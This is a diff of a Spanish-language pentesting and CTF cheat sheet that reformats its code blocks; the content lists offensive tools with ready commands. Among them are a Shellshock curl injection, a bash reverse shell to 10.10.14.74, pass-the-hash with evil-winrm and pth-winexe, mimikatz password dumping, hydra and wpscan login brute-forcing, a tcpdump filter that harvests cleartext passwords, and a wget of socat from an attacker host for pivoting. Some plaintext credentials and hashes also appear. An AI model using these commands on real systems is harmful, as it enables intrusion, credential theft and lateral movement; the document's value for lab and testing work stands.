@@ -64,7 +64,8 @@ FrameWork que permite la generación de archivos word capaces de devolver sessio
 ### Cadaver 
 para conectarse a servicios webdav 
 
-'''$cadaver http://<ip>/webdav 
+```bash
+$cadaver http://<ip>/webdav 
 
 login to the XAMPP server's WebDAV folder  
 
@@ -80,7 +81,8 @@ put /tmp/helloworld.txt 
 
 browse to your uploaded file  
 
-load URL, http://<REMOTE HOST>/webdav/helloworld.txt, in browser '''
+load URL, http://<REMOTE HOST>/webdav/helloworld.txt, in browser 
+```
 
 Desde <http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html>  
 
@@ -88,15 +90,22 @@ Desde <http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.
 ### Cewl 
 (Accent Keyword Extractor) extrae las palabras de una página web y genera un diccionario 
 
-'''cewl <url> -d 0 -m 6 -w <nombre.dic> '''
+```bash
+cewl <url> -d 0 -m 6 -w <nombre.dic> 
+```
 
  
 
 ### ShellShock con curl 
 
+```bash
 curl -H "User-Agent: () { :;}; echo; <comando>" http://hello.com/cgi-bin/<cualquier ejecutable que se encuentre aquí> 
+```
 
-Ejemplo: /bin/bash -c "bash -i >& /dev/tcp/10.10.14.74/443 0>& 
+Ejemplo: 
+```bash
+/bin/bash -c "bash -i >& /dev/tcp/10.10.14.74/443 0>& 
+```
 
 ### CertUtil 
 https://www.hackingarticles.in/windows-for-pentester-certutil/ 
@@ -110,32 +119,38 @@ ver detalle
 ### Crunch 
 Crea password para hacer diccionarios 
 
-'''crunch 8 8 -t telsur%% | aircrack-ng -w - test-01.cap -e something 
+```crunch 8 8 -t telsur%% | aircrack-ng -w - test-01.cap -e something 
 
 crunch 8 8 0123456789 | pyrit -r msc-01.cap -i - attack_passthrough 
 
 crunch 6 7 eghotu0134 | perl -ne 'print unless /([a-z]).*\1/' > wordlist.txt 
 
-crunch 8 8 987 -t @%%%%%%% -p +569 -o numeros.txt  (genera números de celulares chilenos) '''
+crunch 8 8 987 -t @%%%%%%% -p +569 -o numeros.txt  (genera números de celulares chilenos) ```
 
 ### Dig 
 Obtiene información de dns (puerto 53) para un dominio particular 
 
-'''dig windcorp.thm any @10.10.78.247 '''
+```bash
+dig windcorp.thm any @10.10.78.247 
+```
 
  
 
 ### Dirb 
 enumera urls disponibles de un dominio, por medio de probar las carpetas más comunes. 
 
-'''dirb http://<sitio>/<path>;  dirb http://192.168.1.103 -X .php '''
+```bash
+dirb http://<sitio>/<path>;  dirb http://192.168.1.103 -X .php 
+```
 
  
 
 ### dmitry
 para obtención de información 
 
-'''dmitry -s -n <host> '''
+```bash
+dmitry -s -n <host> 
+```
 
  
 ### DNSenum 
@@ -164,9 +179,9 @@ extrae y modifica metadatos
 
 ### Evil-winrm  
 explota pass the hash 
-'''Sudo gem install evil-winrm 
+```Sudo gem install evil-winrm 
 
-evil-winrm -i 10.10.136.125 -H e4876a80a723612986d7609aa5ebc12b --user Administrator '''
+evil-winrm -i 10.10.136.125 -H e4876a80a723612986d7609aa5ebc12b --user Administrator ```
 
 Crea una shell directamente en el equipo windows. 
 
@@ -175,11 +190,11 @@ https://blog.spookysec.net/kerberos-abuse/
 
 ### fcrackzip 
 para usar fuerza bruta en zips. 
-'''fcrackzip -v -D -u -p /usr/share/dict/words secret.zip '''
+```fcrackzip -v -D -u -p /usr/share/dict/words secret.zip ```
  
 ### Forfiles (windows) 
 
-'''C:\>forfiles /P C: /S /M "*curso*" -> busca en el disco todos los archivos que contengan en el nombre curso '''
+```C:\>forfiles /P C: /S /M "*curso*" -> busca en el disco todos los archivos que contengan en el nombre curso ```
 
 ### Fluxion 
 crackear wifi 
@@ -192,7 +207,7 @@ muestra características del archivo a modo de identificar su tipo. (magic numbe
 ### Find
 Para encontrar archivos o cadenas de texto. 
 
-'''find / -perm -u=s -type f 2>/dev/null        sirve para encontrar ejecutables que se pueden correr como root 
+```find / -perm -u=s -type f 2>/dev/null        sirve para encontrar ejecutables que se pueden correr como root 
 
 find / -perm -4000 2>/dev/null               lo mismo. 
 
@@ -206,7 +221,7 @@ find . -exec grep foo {} \; will show you output like this from foo import bar
 
 find . -exec grep -l foo {} + will show you output like this ./dir/file.py  
 
-find . -exec grep -l foo {} \; will show you output like this ./dir/file.py  '''
+find . -exec grep -l foo {} \; will show you output like this ./dir/file.py  ```
 
 Desde <https://unix.stackexchange.com/questions/12902/how-to-run-find-exec>  
 
@@ -219,23 +234,23 @@ Encripta y desencripta PGP  (no es necesario usar openssl)
 
 En caso de encontrar *.pgp y private.asc 
 
-'''gpg --import private.asc'''
+```gpg --import private.asc```
 para agregar la llave a la base de datos local. (necesitarás crackear el pass con pgp2john y " hash" 
 
-'''gpg --decrypt algo.pgp'''
+```gpg --decrypt algo.pgp```
 y poner la contraseña crackeada 
 http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/ 
 
 ### Gobuster 
 
-'''gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://jeff.thm/ -t 20     --> para fuzzear virtualhosts 
+```gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://jeff.thm/ -t 20     --> para fuzzear virtualhosts 
 
-gobuster dns -d http://mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt '''
+gobuster dns -d http://mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt ```
 
 ### grep 
 revisa el contenido de los archivos 
 
-'''grep '\=$' -> sirve para encontrar base64 dentro de archivos en CTFs 
+```grep '\=$' -> sirve para encontrar base64 dentro de archivos en CTFs 
 
 grep -E '(192.168.0.30|192.168.0.40)' -> busca ambas ip simultaneamente 
 
@@ -245,7 +260,7 @@ grep -oP '".*?"'  ->muestra el contenido de las comillas dobles
 
 grep -io "[0-9]\{1,2\}"  busca números de uno o dos dígitos que contengan del 0 al 9. 
 
-grep 'c:\\users\\' para evitar el backslash trailing. Es necesario usar comilla simple y doble backslash. '''
+grep 'c:\\users\\' para evitar el backslash trailing. Es necesario usar comilla simple y doble backslash. ```
 
 ### Flags 
 
@@ -281,15 +296,15 @@ Para identificar qué cifrado tiene un texto
 ### Hydra, xhydra 
 Logueador por fuerza bruta web. 
 
-'''hydra -L <name.txt> -P <pass.txt> <ip> http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR”   
+```hydra -L <name.txt> -P <pass.txt> <ip> http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR”   
 
-hydra -l admin -P /pass.txt <ip> -s 8081 http-post-form "/info/login.html:admin_Username=^USER^&admin_Password=^PASS^:submit=logIn_btn" -V -t 1 '''
+hydra -l admin -P /pass.txt <ip> -s 8081 http-post-form "/info/login.html:admin_Username=^USER^&admin_Password=^PASS^:submit=logIn_btn" -V -t 1 ```
 
 o 
-'''hydra -l admin -P <passwordlist> -e ns -V <targetip> http-get /  
+```hydra -l admin -P <passwordlist> -e ns -V <targetip> http-get /  
 hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123 
 Hydra -e nsr <ip> pop3 -l <user> -P <rockyou.txt> -s <port> -V 
-hydra -l username -P password_file.txt -s port -f ip_address request_method /path '''
+hydra -l username -P password_file.txt -s port -f ip_address request_method /path ```
 (para htaccess) 
 
 
@@ -297,8 +312,8 @@ hydra -l username -P password_file.txt -s port -f ip_address request_method /pat
 ### john 
 crackea password 
 
-'''john --wordlist=rockyou.txt <passfile> --pot=<dondequieroquedejelosresultados> '''
-'''john file.hash'''
+```john --wordlist=rockyou.txt <passfile> --pot=<dondequieroquedejelosresultados> ```
+```john file.hash```
 (para crackear el hash de un zip hecho con zip2john) se puede usar el parámetro --incremental para fuerza bruta. 
 
  
@@ -310,7 +325,7 @@ Cambia la mac address
 ### Macof 
 Para hacer MAC flooding. (en este estado el switch pasa a hacer broadcast (sale de unicast) y con wireshark se puede interceptar el contenido de la comunicación. 
 
-'''macof -i <interface> -n <cantidad de veces> '''
+```macof -i <interface> -n <cantidad de veces> ```
 
 
  
@@ -321,7 +336,7 @@ Permite, a través de un dato cualquiera (cuenta de usuario, dominio, mail, etc.
 ### Medusa 
 Para crackear páginas con .htaccess.  
 
-'''medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test.php - '''
+```medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test.php - ```
 
 
 ### Metasploit 
@@ -331,7 +346,7 @@ Para explotar vulnerabilidades y escanear
 ### Mimikatz 
 Mimikatz junto con Windows Credential Editor son capaces de leer de la memoria para obtener las claves en texto plano. 
 
-'''mimikatz.exe privilege::debug sekurlsa::logonPasswords full exit'''
+```mimikatz.exe privilege::debug sekurlsa::logonPasswords full exit```
 (debe ser ejecutado en una ventana con permisos de administrador) 
 
  
@@ -346,7 +361,7 @@ Encuentra equipos prendidos en la red.. (si no se le pone parámetros, busca en 
 ### Nikto 
 Audita servidor en búsqueda de vulnerabilidades conocidas. 
 
-'''nikto -h <IP> '''
+```nikto -h <IP> ```
 
  
 ### Nmap 
@@ -356,7 +371,7 @@ Escaneador por excelencia. (ver detalles)
 ### nslookup  
 Para realizar osint a servers de correo 
 
-'''$nslookup 
+```$nslookup 
 
 >set q=txt 
 
@@ -366,7 +381,7 @@ Para realizar osint a servers de correo
 
 >_dmarc.<domain>      | para ver dmarc 
 
->exit '''
+>exit ```
 
 ### Leafpad 
 Notepad en interfaz gráfica de kali 
@@ -375,45 +390,45 @@ Notepad en interfaz gráfica de kali
 ### Ophcrack 
 crackea contraseñas con rainbow table 
 
-'''sudo ophcrack-cli -d /mnt/c/z/ophcrack_xp_tables -t xp_special -f hash -o dump -u '''
+```sudo ophcrack-cli -d /mnt/c/z/ophcrack_xp_tables -t xp_special -f hash -o dump -u ```
  
 ### Perl 
 Ejecuta código pl 
 
-'''perl -ne 'print unless /([a-z]).*\1/' dict.txt > outfile.txt '''
+```perl -ne 'print unless /([a-z]).*\1/' dict.txt > outfile.txt ```
 sirve para extraer de un diccionario las palabras que no repiten caracteres 
 
 ### pth-winexe 
 Pass the Hash sirve para ejecutar comandos desde un linux sobre un equipo windows comprometido 
 
-'''pth-winexe -U WorkGROUP/Administrator%<hashntlm> //<ipvictima> <comandodeseado>'''
+```pth-winexe -U WorkGROUP/Administrator%<hashntlm> //<ipvictima> <comandodeseado>```
 (puede ser cmd.exe) 
 
 Es necesario repertir el último hash. Ejemplo 
 
-'''E_md4hash wrapper called. 
+```E_md4hash wrapper called. 
 HASH PASS: Subst user supplied NTLM HASH. 
 Microsoft Windows [Verstn 19.0. 14393] 
 (c) 2016 Microsott Corporation. Todos Los derechos reservados. 
 whoami 
-s4vicorp\administrador pth-wtnexe -U s4vtcorp/Admtntstrador020ae267eY4d417tcteoet4gecbd4b33:92eae267e048417tcteeot49ecbd4b33 //192.168. let. 133 cmd '''
+s4vicorp\administrador pth-wtnexe -U s4vtcorp/Admtntstrador020ae267eY4d417tcteoet4gecbd4b33:92eae267e048417tcteeot49ecbd4b33 //192.168. let. 133 cmd ```
  
 
 
 ### Python 
 Para ejecutar .py 
 
-''' python -c 'import pty; pty.spawn("/bin/sh")' '''
+``` python -c 'import pty; pty.spawn("/bin/sh")' ```
  sirve para cargar consola una vez conectado por nc a un servidor. 
 
-'''  CTRL +Z 
+```  CTRL +Z 
 
   stty raw -echo 
 
-fg enter enter '''
+fg enter enter ```
 
-'''python -m SimpleHTTPServer 80 '''
-'''python3 -m http.server 8080 '''
+```python -m SimpleHTTPServer 80 ```
+```python3 -m http.server 8080 ```
 sirve para levantar un servicio web simple con file dir. 
 
  
@@ -426,18 +441,18 @@ herramienta de shell que permite, en base a un archivo de configuración con lis
 ### psexec.py 
 sirve para levantar shell en windows desde linux, sabiendo la contraseña. 
 
-'''psexec.py clk:clk123@10.10.10.1 cmd.exe 
+```psexec.py clk:clk123@10.10.10.1 cmd.exe 
 
-Psexec.py -hashes :<ntlm/hash> <user>@<host>   --->pass the hash del ntlm '''
+Psexec.py -hashes :<ntlm/hash> <user>@<host>   --->pass the hash del ntlm ```
 
  
 
 ### rpl 
 Comando que permite reemplazar una cadena de texto por otra en un archivo 
-'''rpl <original> <reemplazo> <archivo.txt>'''
+```rpl <original> <reemplazo> <archivo.txt>```
 
 ### Rabin2 
-'''rabin2 –zzz'''
+```rabin2 –zzz```
 Además de revisar binarios, este comando puede mostrar los strings mejor que STRINGS 
 
 ### Searchsploit 
@@ -452,12 +467,12 @@ ver detalles
 
 ### Smbget  
 
-''' smbget –R smb://10.10.10.172/user$ -U 'user' '''
+``` smbget –R smb://10.10.10.172/user$ -U 'user' ```
 
 ### smbmap 
 sirve para revisar carpetas compartidas en puerto 445. 
 
-'''smbmap -u jpalma -p <pass> -d cnt -H mateo.cnt.telsur.cl -r <path_optional> 
+```smbmap -u jpalma -p <pass> -d cnt -H mateo.cnt.telsur.cl -r <path_optional> 
 
 smbmap -H 10.10.10.100 -A Groups.xml -R Replication -q 
 
@@ -467,11 +482,11 @@ smbmap -H <ip> -r share  -->conecta al smb
 
 smbmap -H <ip> --upload <algo> <dirdest/algo> 
 
-smbmap –H 8.8.8.8 -u 'null' '''
+smbmap –H 8.8.8.8 -u 'null' ```
 
 
 ### smbserver.py 
-'''smbserver.py <nombredelrecurso> <directorioacompartir> '''
+```smbserver.py <nombredelrecurso> <directorioacompartir> ```
 
 
 ### ss (socket statistics) 
@@ -481,20 +496,20 @@ https://neverendingsecurity.wordpress.com/2015/04/13/ss-socket-statistics-comman
 ### ssh 
 -o StrictHostKeyChecking=no   --->evita que pida confirmaciòn 
 Portforward 
-'''ssh -L 80:172.0.0.1:80 root@victima '''
+```ssh -L 80:172.0.0.1:80 root@victima ```
 
 ### Steghide
 programa de esteganografía 
 
-'''steghide embed -ef sample.txt -cf image.jpg -sf output.jpg 
+```steghide embed -ef sample.txt -cf image.jpg -sf output.jpg 
 
-steghide extract -sf image.jpg -p <pass> '''
+steghide extract -sf image.jpg -p <pass> ```
 
 
 ### Stegsnow 
 
-'''stegsnow –m secreto infile outfile 
-stegsnow –C outfile '''
+```stegsnow –m secreto infile outfile 
+stegsnow –C outfile ```
 
  
 ### Shodan
@@ -508,15 +523,15 @@ Permite buscar cámaras ip vía shodan y crackear sus password.
 ### Socat 
 para pivotear en otra red (o para hacer port forwarding) 
 
-'''cd /tmp 
+```cd /tmp 
 wget http://10.10.14.6/socat (hay que levantar un servicio web para ofrecerlo) 
 chmod +x socat 
-./socat tcp-listen:<ipquequierousar>,reuseaddr,fork tcp:<ip>:<ipreal> '''
+./socat tcp-listen:<ipquequierousar>,reuseaddr,fork tcp:<ip>:<ipreal> ```
 
 ### tcpdump
 sniffer de tráfico local de red
-'''tcpdump -i tun0 icmp 
-tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 '''
+```tcpdump -i tun0 icmp 
+tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 ```
 
 ### TheHarvester 
 Recopila información (ejecutar en modo sudo, dado que es necesario escribir datos en disco) 
@@ -530,17 +545,17 @@ Descubre vulnerabilidades de LFI de java (https://github.com/epinna/tplmap)
 ### tshark 
 línea de comando de wireshark. Puede mostrar estadísticas de un .pcap 
 
-'''tshark -nnr imadecoy -qz  io,phs (estadísticas de jerarquía) 
-tshark -nnr imadecoy -qz ip_hosts,tree (estadísticas de tráfico) '''
+```tshark -nnr imadecoy -qz  io,phs (estadísticas de jerarquía) 
+tshark -nnr imadecoy -qz ip_hosts,tree (estadísticas de tráfico) ```
 
 #### Metodología de revisión tshark
-'''$tshark -r <captured.cap>         --->analiza tráfico 
+```$tshark -r <captured.cap>         --->analiza tráfico 
 
 $tshark -r <captured.cap> -Tjson  --->muestra todos los campos 
 
 $tshark -r <captured.cap> -Tfields -e <campo> --->filtra sólo por un campo ejemplo data.data 
 
-$tshark -r <captured.cap> -Tfields -e <campo> -Y "<protocolo>" | xxd -r -p  ---> traduce el contenido de hex a textoplano '''
+$tshark -r <captured.cap> -Tfields -e <campo> -Y "<protocolo>" | xxd -r -p  ---> traduce el contenido de hex a textoplano ```
  
 ### ViMdecript  
 https://raw.githubusercontent.com/nlitsme/vimdecrypt/publicbranch/vimdecrypt.py 
@@ -548,9 +563,9 @@ https://raw.githubusercontent.com/nlitsme/vimdecrypt/publicbranch/vimdecrypt.py
  
 ### wget 
 Para descargar webpages.. Puede ser la página principal o el sitio completo. 
-'''wget -r <url>'''
+```wget -r <url>```
 descarga recursiva
-'''wget --no-check-certificate https://140.211.11.121/ '''
+```wget --no-check-certificate https://140.211.11.121/ ```
 para descargar páginas donde el certificado está malo. 
 
  
@@ -559,9 +574,9 @@ para recorrer(fuzzear) urls con parámetros definidos.
 
 para fuzzear web 
 
-'''wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19 '''
+```wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19 ```
 para fuzzear login 
-'''wfuzz -c -L -t 500 --hh=27136 -w wordlist.txt -d 'username=Giovanni@password=FUZZ' http://10.10.10.153/moodle/login/index.php '''
+```wfuzz -c -L -t 500 --hh=27136 -w wordlist.txt -d 'username=Giovanni@password=FUZZ' http://10.10.10.153/moodle/login/index.php ```
 -c 
 -L follow redirect 
 -t threads 
@@ -571,7 +586,7 @@ para fuzzear login
 
 Para fuzear subdominios 
 
-'''wfuzz -w /directory.txt -H "host: FUZZ.host.com" --hc 200 --hw 356 -t 100 <ip> '''
+```wfuzz -w /directory.txt -H "host: FUZZ.host.com" --hc 200 --hw 356 -t 100 <ip> ```
 (si encuentras, para luego verlos, hay que agregarlos al archivo /etc/hosts )  
 
 ### WinRM 
@@ -581,10 +596,10 @@ https://www.hackingarticles.in/winrm-penetration-testing/
 ### wmic
 ejecuta ordenes al sistema windows. (para windows) 
 
-'''wmic volume get driveletter, label | findstr "CLK" '''
+```wmic volume get driveletter, label | findstr "CLK" ```
 identifica en qué unidad está la USB 
 
-'''for /f %d in ('wmic volume get driveletter^, label ^| findstr "CLK"') do set duck=%d '''
+```for /f %d in ('wmic volume get driveletter^, label ^| findstr "CLK"') do set duck=%d ```
 
 ### wireshark 
 sniffer de red 
@@ -595,8 +610,8 @@ escaneador de servidores wordpress
 
 ### wpscan 
 Escaneador de vulnerabilidades de wordpress y logueador de fuerza bruta o diccionario
-'''wpscan --url <ip/path> --enumerate vp
-wpscan --url www.test.local --wordlist pwd_dict.txt --username admin '''
+```wpscan --url <ip/path> --enumerate vp
+wpscan --url www.test.local --wordlist pwd_dict.txt --username admin ```
 https://www.hackingarticles.in/wpscanwordpress-pentesting-framework/ 
 
 
@@ -605,23 +620,23 @@ Analisis de vulnerabilidades web (http://wapiti.sourceforge.net/)
 
 ### Xfreerdp
 
-'''xfreerdp /u:fela /d:corp /p:"rubenF124" /v:10.10.164.123 /cert-ignore /f '''
+```xfreerdp /u:fela /d:corp /p:"rubenF124" /v:10.10.164.123 /cert-ignore /f ```
 /f fullscreen. Se desconecta con ctrl+alt+enter 
 
 ### xsltproc 
 transforma un export de nmap en un reporte amistoso 
-'''xsltproc archivo.xml >archivo.html '''
+```xsltproc archivo.xml >archivo.html ```
 
 ### xxd 
 muestra el contenido hexadecimal del un archivo 
 
-'''xxd -r '''
+```xxd -r ```
 reversa desde un hexadecimal a binario
 
 ### yersinia 
 FrameWork para ataques a la capa 2, genera starvation del dhcp 
 
 ### Zip2john 
-'''zip2john test.zip > zip.hashes '''
+```zip2john test.zip > zip.hashes ```
 genera hash de un zip para luego crackearlo con john
 
